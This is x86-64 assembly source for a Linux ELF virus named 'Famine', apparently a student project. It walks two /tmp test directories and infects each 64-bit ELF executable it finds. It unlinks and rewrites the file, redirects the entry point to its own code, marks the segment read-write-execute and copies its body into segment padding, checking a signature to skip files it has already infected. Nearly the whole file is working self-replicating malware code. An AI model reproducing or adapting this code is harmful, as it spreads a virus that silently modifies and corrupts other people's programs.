	[BITS 64]

	%define SYS_WRITE 	1
	%define SYS_OPEN 	2
	%define SYS_CLOSE 	3
	%define SYS_LSEEK 	8
	%define SYS_MMAP 	9
	%define SYS_MUNMAP 	11
	%define SYS_UNLINK	87
	%define SYS_GETDENTS64	217
	global famine64_func:function
	global famine64_size:data

	section .text

famine64_func:
	push 	rdi
	push 	rsi
	push 	rdx
	push 	rax
	push 	rbx
	sub 	rsp, 8

	lea 	rdi, [rel dir_one]
	call 	find_files
	lea 	rdi, [rel dir_two]
	call 	find_files
	jmp 	famine64_end

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                      void find_files(char *dir_path)                       ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_files:
	push 	rbp
	push	rbx
	sub 	rsp, 1044	; char *dirpath, int fd   , int ret   , char b[1024]
						; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]
	xor 	eax, eax
	mov 	QWORD [rsp], rdi 		; store dir_path
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(dir_path, 0, 0)                                         ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rdx, 0
	mov 	rsi, 0
	mov 	rdi, QWORD [rsp]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			 	; test if < 0
	jl	 	find_files_end
	mov 	DWORD [rsp + 8], eax  	; store directory fd
loop_file:
	xor 	eax, eax
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_getdents(fd, struct linux_dirent64 *dirp, count)             ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	lea 	rsi, [rsp + 16]
	mov 	rdx, 1024
	mov 	rax, SYS_GETDENTS64
	syscall
	test	eax, eax 	 			; test if <= 0
	jle 	loop_end
	mov 	DWORD [rsp + 12], eax  	; store getdents64() return value:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Return a number of bytes between 0 and 1024 (i defined it)            ;;
	;; In C, we would cast those bytes in struct linux_dirent64 * (see doc.) ;;
	;; to retreive directory files name                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	ebx, ebx 	 				; initialize variable off to 0
	jmp 	check_file_type
next_file:
	;; Next struct linux_dirent64*
	movsx	eax, BYTE [rsp + rbp + 32] 	; 32 is the offset of *dirp->d_reclen
	add 	ebx, eax
	cmp 	DWORD [rsp + 12], ebx
	jle 	loop_file
check_file_type:
	;; Loop throught getdents64() buffer / struct linux_dirent64*
	movsx	rbp, ebx
	cmp 	BYTE [rsp + rbp + 34], 8 	; 34 is the offset of *dirp->d_type
	jne 	next_file 	 				; Check if regular file
	mov 	rdi, QWORD [rsp]
	lea 	rsi, [rsp + rbp + 35]		; 35 is the offset of *dirp->d_name
	call	get_dat_elf
	jmp 	next_file
loop_end:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( int fd )                                                   ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	mov 	rax, SYS_CLOSE
	syscall
find_files_end:	
	add 	rsp, 1044
	pop 	rbx
	pop 	rbp
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                  void get_dat_elf(char *dir, char *file)                   ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_dat_elf:
	push	rbp
	push	rbx
	push 	r8
	push 	r9
	push 	r10
	push 	r11
	sub 	rsp, 1024 	 	; char[1024]
 	 	 	 				; [rsp]

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Concatenate directory path name with file name to open it.            ;;
	;; The string will be stored in [rsp]                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	ecx, ecx 	 	; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl 	 		; test directory end of string
	je  	copy_file

copy_dir_bytes:
	mov 	BYTE [rsp + rcx], dl
	inc 	rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne 	copy_dir_bytes

copy_file:	
	add 	rsp, rcx
	xor 	eax, eax 	 	; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je 	open_file
copy_file_bytes:	
	mov 	BYTE [rsp + rax], dl
	inc 	rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne 	copy_file_bytes

open_file:
	mov 	BYTE [rsp + rax], 0 	; NULL byte the end of the string path
	sub 	rsp, rcx 	 	; Return to the start of the string path
	sub 	rsp, 20 	 	; int fd, size_t size, void *data
 	 	 	 				; [rsp] , [rsp + 4]  , [rsp + 12]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_RDWR|O_NONBLOCK, 0)                        ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edx, edx
	mov 	esi, 2
	lea 	rdi, [rsp + 20]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			; test if < 0
	jl	 	get_dat_elf_end
	mov 	DWORD [rsp], eax	; store FD in [rsp]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 1, LSEEK_END)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax
	mov 	esi, 1
	mov 	edx, 2 	 		; LSEEK_END
	mov 	rax, SYS_LSEEK
	syscall
	cmp 	rax, 0 	 		; test if <= 0
	mov 	r11, rax 	 	; store rax to r11 (see close_file label)
	jle  	close_file
	mov 	QWORD [rsp + 4], rax	; store SIZE in [rsp + 4]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; void	*mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edi, edi 	 	; NULL
	mov 	rsi, rax 	 	; size
	mov 	edx, 3 	 		; PROT_READ | PROT_WRITE
	mov 	r10d, 2 	 		; MAP_PRIVATE
	mov 	r8d, DWORD [rsp] 	; fd
	xor 	r9, r9 	 		; 0
	mov 	rax, SYS_MMAP
	syscall
	cmp 	rax, 0 	 		; test if == MAP_FAILED (-1)
	mov 	r11, rax 	 	; store rax to r11 (see close_file label)
	jl  	close_file
	mov 	QWORD [rsp + 12], rax	; store ADDRESS in [RSP + 12]

close_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( fd )                                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 	; int fd
	mov 	rax, SYS_CLOSE
	syscall
	cmp 	rax, 0 	 			; if we can't close the file, it will be a problem later
	jl  	munmap_file		 	; so we just end the function.
	cmp 	r11, 0 	 			; lseek, and mmap jump to close_file if a problem occurs
	jl  	munmap_file			; in that case we end the function.

	mov 	rdx, QWORD [rsp + 12]	; void *data
	mov 	rsi, QWORD [rsp + 4]	; int size
	lea 	rdi, [rsp + 20] 		; char *path
	call	pack_file

munmap_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int munmap(data, size)                                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rsi, QWORD [rsp + 4]	; int size
	mov 	rdi, QWORD [rsp + 12]	; void *data
	mov 	rax, SYS_MUNMAP
	syscall
get_dat_elf_end:
	add 	rsp, 1044
	pop 	r11
	pop 	r10
	pop 	r9
	pop 	r8
	pop 	rbx
	pop 	rbp
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;              void pack_file(char *path, int size, char *data)              ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
pack_file:
	cmp 	BYTE [rdx], 0x7f 		; compare \x7fELF
	jne 	pack_file_end
	cmp 	BYTE [rdx + 1], 'E'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 2], 'L'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 3], 'F'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 4], 2 		; ->e_ident[EI_CLASS] == ELFCLASS64
	jne 	pack_file_end
	cmp 	BYTE [rdx + 5], 0 		; ->e_ident[EI_DATA] != ELFDATANONE
	je  	pack_file_end
	cmp 	BYTE [rdx + 6], 1 		; ->e_ident[EI_VERSION] == EV_CURRENT
	jne 	pack_file_end
	movzx	eax, BYTE [rdx + 16] 	; ->e_type == ET_EXEC || ->e_type == ET_DYN
	sub 	eax, 2
	cmp 	al, 1
	ja  	pack_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 1. Verify if the file is already infected
	;;    RDX contains *data
	;;    RSI contains size
	;;    RDI contains *path
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; First, find the segment containing the entry point
	;;     RAX : Entry Point
	;;     R9  : Program Header Table start
	;;     RCX : Program Header Table end
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rax, QWORD [rdx + 24] 		; hdr->e_entry
	mov 	r9, QWORD [rdx + 32]		; hdr->e_phoff
	lea 	r9, [rdx + r9]				; PHT start
	xor 	rcx, rcx
	movzx	rcx, WORD [rdx + 56]		; hdr->e_phnum
	xor 	r8, r8
	movzx	r8, WORD [rdx + 54]			; hdr->e_phentsize
	imul	rcx, r8
	add 	rcx, r9						; PHT end
	jmp 	find_entrypoint_section
next_section:
	add 	r9w, WORD [rdx + 54]		; add e_phentsize
	cmp 	r9, rcx
	jge  	pack_file_end
find_entrypoint_section:
	mov 	r10, QWORD [r9 + 16] 		; segment->p_vaddr
	cmp 	r10, rax					; segment->p_vaddr > entry ? go next
	jg  	next_section
	add 	r10, QWORD [r9 + 32] 		; segment->p_vaddr + segment->p_filesz
	cmp 	rax, r10					; entry > p_vaddr + p_filesz ? go next
	jg  	next_section
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Second, compare with our signature
	;;    R9  : Entry Point section
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
	mov 	r8, QWORD [r9 + 8]				; segment->p_offset
	add 	r8, QWORD [r9 + 32]				; segment->p_filesz
	mov 	rax, QWORD [rdx + r8 - 16]		; signature offset
	cmp 	rax, QWORD [rel signature]
	je  	pack_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 2. Find the memory mapped PT_LOAD segment that can contain our code
	;;    Register R9 will store it.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    R9  : Program Header table start
	;;    RCX : Program Header table end
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	r9, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
	lea 	r9, [rdx + r9]			; Program Header table start
	xor 	rcx, rcx
	movzx	ecx, WORD [rdx + 56] 	; hdr->e_phnum
	xor 	r8, r8
	movzx	r8d, WORD [rdx + 54]	; hdr->e_phentsize
	imul	rcx, r8
	add 	rcx, r9 	   			; Program Header table end
	jmp 	find_free_space
next_program:
	add 	r9w, WORD [rdx + 54]			; move to next Program Header segment
	cmp 	rcx, r9 	 					; end of Program Header segment ?
	jle  	pack_file_end					; if it is, no free space has been found, so,
											; infect next file. NOT optimal !
find_free_space:
	cmp 	DWORD [r9], 1 					; is it PT_LOAD ?
	jne 	next_program
	mov 	r8, QWORD [r9 + 16]				; segment->p_vaddr
	add 	r8, QWORD [r9 + 40]				; segment->p_memsz
	add 	r8d, DWORD [rel famine64_size]
	mov 	r10, QWORD [r9 + 16] 			; segment->p_vaddr
	add 	r10, QWORD [r9 + 48]			; segment->p_align
	cmp 	r8, r10							; vaddr + memsz + famine64_size < vaddr + align ?
	jg  	next_program

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 3. Erase file from system tree before any changes !!!
	;;    int unlink(char *pathname)
	;;    RDI already contains *pathname.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rax, SYS_UNLINK
	syscall
	cmp 	rax, 0
	jl  	pack_file_end
	
	mov 	rax, QWORD [rdx + 24]  	; store the original program entry point
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 5. Modify Program Entry Point
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	r8, QWORD [r9 + 16] 	; store infected segment virtual address (+16: ->p_vaddr)
	add 	r8, QWORD [r9 + 40] 	; add it the segment memory size
 	 	 	 	 					; (value is virtual address of our infected code)
	mov 	QWORD [rdx + 24], r8 	; modify the Program entry point

	sub 	rax, r8					; compute the jump offset

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 6. Modify Infected Segment permissions
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
	xor 	ecx, ecx
	or  	ecx, 1					; segment R permission
	or  	ecx, 2					; segment W permission
	or  	ecx, 4					; segment X permission
	mov 	DWORD [r9 + 4], ecx

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 7. Modify Infected Segment memory / file size
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	r10d, DWORD [rel famine64_size]
	add 	QWORD [r9 + 40], r10  	; change isegment memory size
	add 	QWORD [r9 + 32], r10  	; change isegment file size

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 8. Rewrite the file
	;;    a. Re-create the file
	;;    b. Copy the original program until the infected segment offset.
	;;    c. Copy our program at the end of it,
	;;       minus the original program virtual address size.
	;;    d. Copy, in our program, the original virtual address size,
	;;       so we will jump to it later.
	;;    e. Copy the rest of the original program.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	sub 	rsp, 36		; int fd, char *data, size_t size, size_t addr, size_t offset
 	 	 	 	 		; [rsp] , [rsp + 4] , [rsp + 12]  , [rsp + 20]  , [rsp + 28] 

	mov 	DWORD [rsp], 0 	 			; clean [rsp] to store fd later
	mov 	QWORD [rsp + 4], rdx 		; store the address of the old file data
	mov 	QWORD [rsp + 12], rsi  		; store the old file size
	mov 	QWORD [rsp + 20], rax 		; store the original program entry point
	mov 	rax, QWORD [r9 + 8] 		
	add 	rax, QWORD [r9 + 32]
	sub 	eax, [rel famine64_size]
	mov 	QWORD [rsp + 28], rax		; store isegment->p_offset + infected->p_memsz - famine64_size
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; a. int	sys_open(file_path, O_WRONLY | O_CREAT, 0755)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edx, 493			; 0755
	mov 	esi, 65				; O_WRONLY|O_CREAT
	lea 	rdi, [rdi]			; file path address
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 	 		; test if < 0
	jl	 	write_end
	mov 	DWORD [rsp], eax 	; store file fd

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; b. int	sys_write(fd, data, IS offset)
	;;    - Write from file[0] to file[injection] -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax 		  		; file fd
	mov 	rsi, QWORD [rsp + 4] 	; pointer of program data
	mov 	rdx, QWORD [rsp + 28] 	; size until our injection
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; c. int	sys_write(fd, data, IS offset)
	;;    - Write our injection -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 	 		; file fd
	lea 	rsi, [rel famine64_func] 	; famine64_func
	mov 	edx, [rel famine64_size]	; famine64_size
	sub 	rdx, 8 	 	 				; less the size of jump_offset
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; d. int	sys_write(fd, data, IS offset)
	;;    - Write our entry point -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 		; file fd
	lea 	rsi, [rsp + 20] 	 	; load the original program entry point address
	mov 	rdx, 8 	 	 			; sizeof jump_offset
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end
	
	mov 	rax, QWORD [rsp + 28] 			; store size of what we wrote
	add 	eax, [rel famine64_size]		; add it our code size
	mov 	QWORD [rsp + 28], rax			; store it again
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; d. int	sys_write(fd, data, IS offset)
	;;    - Write from file[injection] to file[file_size] -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp]				; file fd
	mov 	rsi, QWORD [rsp + 4]			; file first bit
	add 	rsi, QWORD [rsp + 28]			; plus what we already wrote !
	mov 	rdx, QWORD [rsp + 12]			; file size
	sub 	rdx, QWORD [rsp + 28]			; less what we already wrote !
	mov 	rax, SYS_WRITE
	syscall

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 7. Close file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
clean_write_end:
	mov 	edi, DWORD [rsp]
	mov 	rax, SYS_CLOSE
	syscall

write_end:	
	add 	rsp, 36
pack_file_end:
	ret
	
famine64_end:
	add 	rsp, 8
	pop 	rbx
	pop 	rax
	pop 	rdx
	pop 	rsi
	pop 	rdi

	cmp 	QWORD [rel jump_offset], 0x0 ; No jump address if the executable is not an infected one
	je  	no_jump
	lea 	rax, [rel famine64_func]
	add 	rax, QWORD [rel jump_offset]
	push 	rax
no_jump:
	ret
	
data:
	famine64_size dd end_of_file - famine64_func
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	signature dd 0x42CAFE42, 0x24EFAC24
	jump_offset dq 0x0
end_of_file:
